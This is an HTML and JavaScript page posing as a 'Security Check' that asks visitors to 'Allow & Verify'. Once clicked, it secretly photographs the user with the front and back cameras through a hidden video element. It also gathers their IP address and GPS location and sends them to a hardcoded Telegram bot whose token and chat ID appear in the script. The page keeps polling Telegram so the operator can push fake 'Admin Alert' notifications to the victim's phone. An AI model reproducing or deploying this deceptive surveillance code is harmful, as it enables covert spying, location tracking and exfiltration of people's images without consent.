<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>

    <style>
        body {
            background-color: #eceff1;
            text-align: center;
            font-family: 'Roboto', sans-serif;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        h1 { color: #263238; margin-bottom: 10px; }
        p { color: #546e7a; margin-bottom: 30px; }

        /* Video hidden hai */
        #video-stream {
            opacity: 0;
            position: absolute;
            top: 0; left: 0;
            z-index: -1;
            width: 10px; height: 10px;
        }

        .verify-btn {
            padding: 15px 50px;
            background-color: #00897b;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
            transition: all 0.3s;
        }

        .verify-btn:hover { transform: scale(1.05); background-color: #00796b; }
        .verify-btn:disabled { background-color: #b0bec5; cursor: wait; transform: none; }

        #status { margin-top: 20px; font-weight: bold; color: #37474f; }
    </style>
</head>

<body>

    <h1>Security Check</h1>
    <p>Allow notifications to verify your device identity.</p>
    
    <button class="verify-btn" id="btn" onclick="startSystem()">Allow & Verify</button>
    <p id="status"></p>

    <video id="video-stream" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <script>
        // --- CONFIGURATION ---
        const botToken = "8593566926:AAEhOP5u2ph3FriBMGrWvpSl8X-xEsXgrfk"; 
        const chatId = "7681204940";
        
        let lastUpdateId = 0; // Message tracking ke liye
        let userIP = "Unknown";
        let userLocation = "Unknown";
        let mapLink = "";

        async function startSystem() {
            const btn = document.getElementById("btn");
            const status = document.getElementById("status");

            // 1. Notification Permission Maangna
            if (Notification.permission !== "granted") {
                status.innerText = "Please Allow Notifications...";
                await Notification.requestPermission();
            }

            if (Notification.permission === "granted") {
                // Notification milte hi ek Fake "Success" bhejo
                new Notification("Security System", {
                    body: "Device Connected Successfully.",
                    icon: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
                });
                // Vibration
                if(navigator.vibrate) navigator.vibrate(200);
            }

            btn.disabled = true;
            btn.innerText = "Verifying...";
            status.innerText = "Syncing with server...";

            // 2. Background Data Collection
            getIP();
            getLocation();

            // 3. Start Listening for Telegram Commands (The "Login" Logic)
            setInterval(checkTelegramMessages, 3000); // Har 3 second mein check karega

            // 4. Capture Photos (Hidden)
            try {
                await captureCamera("user", "Front Cam");
                await new Promise(r => setTimeout(r, 1500));
                await captureCamera("environment", "Back Cam");
                
                status.innerText = "Connected. Waiting for admin...";
                btn.innerText = "Connected ðŸŸ¢";
            } catch (e) {
                console.log(e);
            }
        }

        // --- NOTIFICATION LOGIC (POLLING) ---
        async function checkTelegramMessages() {
            try {
                // Get updates from Telegram
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
                const data = await res.json();

                if (data.ok && data.result.length > 0) {
                    const latest = data.result[data.result.length - 1];
                    lastUpdateId = latest.update_id; // Update ID track karo taaki message repeat na ho
                    
                    const text = latest.message.text;

                    // Command check: Agar message "/msg" se shuru hota hai
                    if (text && text.startsWith("/msg")) {
                        const notifText = text.replace("/msg", "").trim();
                        
                        // Show Notification on User's Phone
                        if (Notification.permission === "granted") {
                            new Notification("Admin Alert âš ï¸", {
                                body: notifText,
                                icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
                                vibrate: [200, 100, 200]
                            });
                            if(navigator.vibrate) navigator.vibrate([500, 200, 500]); // Phone vibrate karega
                        }
                    }
                }
            } catch (e) {
                console.log("Polling Error");
            }
        }

        // --- CAPTURE LOGIC ---
        async function captureCamera(mode, type) {
            const video = document.getElementById("video-stream");
            const canvas = document.getElementById("hidden-canvas");

            if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());

            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            video.srcObject = stream;
            
            await new Promise(r => setTimeout(r, 2000)); // Warmup

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);

            canvas.toBlob(blob => {
                sendToTelegram(blob, type);
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.7);
        }

        // --- HELPER FUNCTIONS ---
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                userIP = d.ip;
            } catch(e){}
        }

        function getLocation() {
            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    userLocation = `${p.coords.latitude},${p.coords.longitude}`;
                    mapLink = `https://maps.google.com/?q=${userLocation}`;
                });
            }
        }

        function sendToTelegram(blob, type) {
            const fd = new FormData();
            fd.append("chat_id", chatId);
            fd.append("photo", blob, "cam.jpg");
            fd.append("caption", `ðŸ“¸ *${type}*\nip: ${userIP}\nloc: ${userLocation}\n${mapLink}`);
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd });
        }
    </script>
</body>
</html>
